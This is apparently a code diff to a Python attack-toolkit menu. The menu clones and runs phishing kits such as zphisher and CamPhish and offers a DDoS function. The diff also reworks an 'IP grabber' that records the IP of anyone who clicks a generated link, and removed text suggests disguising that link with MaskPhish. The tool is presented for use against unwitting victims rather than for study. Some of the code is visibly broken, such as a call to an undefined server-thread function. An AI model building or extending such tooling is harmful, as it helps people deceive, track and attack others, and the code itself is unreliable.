@@ -85,14 +85,6 @@ def clone_and_run(repo_url, dir_name, script_name):
     # Change back to the original directory
     os.chdir('..')
 
-    # Run the specified script
-    if os.path.isfile(script_name):
-        print_centered(f"Running {script_name}...")
-        subprocess.run(['bash', script_name])
-    else:
-        print_centered(f"No {script_name} file found. Please check the repository.")
-    os.chdir('..')  # Change back to the original directory
-
 # DDoS Functionality
 def ddos_function():
     clear_console()
@@ -231,69 +223,22 @@ class IPToolkit:
                 return json.dumps(formatted_data, indent=4)
         except Exception as e:
             return f"Error retrieving geolocation data: {str(e)}"
-ipgrabber_art="""
-┏┓•     ┓    ┳┏┓  ┏┓    ┓ ┓     
-┗┓┓┏┳┓┏┓┃┏┓  ┃┃┃  ┃┓┏┓┏┓┣┓┣┓┏┓┏┓
-┗┛┗┛┗┗┣┛┗┗   ┻┣┛  ┗┛┛ ┗┻┗┛┗┛┗ ┛ 
-      ┛                         
-Tool which sends the IP of anyone clicking a generated link. (Use MaskPhish to make a natural looking link.)
+
+ipgrabber_art = """
+ ┳┓  ┏┓┏┓ ┏┓┏┓┏┓
+ ┣┫┏┛ ┗ ┣┫┣┫ ┏ ┃
+┛┗┛┗┗┛┗┛┗┛ ┛┗┛ Simple IP Grabber 
 """
-
-def wait_for_user():
-    input(Fore.LIGHTYELLOW_EX + "Press Enter to continue..." + Style.RESET_ALL)
-
 def simple_ip_grabber():
     clear_console()
-    print_centered("Starting Simple IP Grabber...")
-    print(Fore.RED+ipgrabber_art)
+    print_centered(ipgrabber_art)
+    print_centered("Starting Simple IP Grabber server on port 8000...")
+    start_server_thread()
+    print_centered("Server started. Visit http://localhost:8000/redirect/<URL> to grab IPs.")
+    wait_for_user()
 
-    # Prompt for URL redirection
-    redirect_url = input(Fore.RED + "Enter the URL to redirect to (include http:// or https://): " + Style.RESET_ALL)
-    url_checker(redirect_url)
-
-    # Create the folder to store captured data
-    capture_folder = create_capture_folder()
-
-    # Automatically find a free port
-    port = find_free_port()
-
-    # Start the HTTP server with redirect URL
-    httpd = HTTPServer(('127.0.0.1', port), SimpleHTTPRequestHandler)
-    print_centered(f"IP Grabber is running! Visit http://127.0.0.1:{port} to grab IPs.")
-    print_centered(f"Redirecting to: {redirect_url}")
-
-    # Serve indefinitely
-    httpd.serve_forever()
-
-def url_checker(url):
-    try:
-        result = requests.get(url)
-        if result.status_code == 200:
-            print_centered("Valid URL!")
-        else:
-            print_centered("Invalid URL!")
-    except requests.exceptions.RequestException as e:
-        print_centered(f"Error: {e}")
-
-def create_capture_folder():
-    folder_name = "captured_ips"
-    if not os.path.exists(folder_name):
-        os.makedirs(folder_name)
-    return folder_name
-
-def find_free_port(start=8000):
-    port = start
-    while True:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            if s.connect_ex(('127.0.0.1', port)) != 0:
-                return port
-            port += 1
-toolkit_menu = """
-┳┏┓  ┏┳┓    ┓┓┏┓• 
-┃┃┃   ┃ ┏┓┏┓┃┃┫ ┓╋
-┻┣┛   ┻ ┗┛┗┛┗┛┗┛┗┗
-Useful tool that can geolocate private IPs.                  
-"""
+def wait_for_user():
+    input(Fore.RED + "Press Enter to return to the main menu..." + Style.RESET_ALL)
 
 def main_menu():
     while True:
@@ -322,7 +267,7 @@ def main_menu():
             clone_and_run("https://github.com/htr-tech/zphisher.git", "zphisher", "zphisher.sh")
             wait_for_user()
         elif choice == '4':
-            clone_and_run("https://github.com/techchipnet/CamPhish.git", "camphish", "camphish.sh")
+            clone_and_run("https://github.com/techchipnet/CamPhish.git", "CamPhish", "camphish.sh")
             wait_for_user()
         elif choice == '5':
             ddos_function()
@@ -338,4 +283,3 @@ def main_menu():
 
 if __name__ == "__main__":
     main_menu()
-
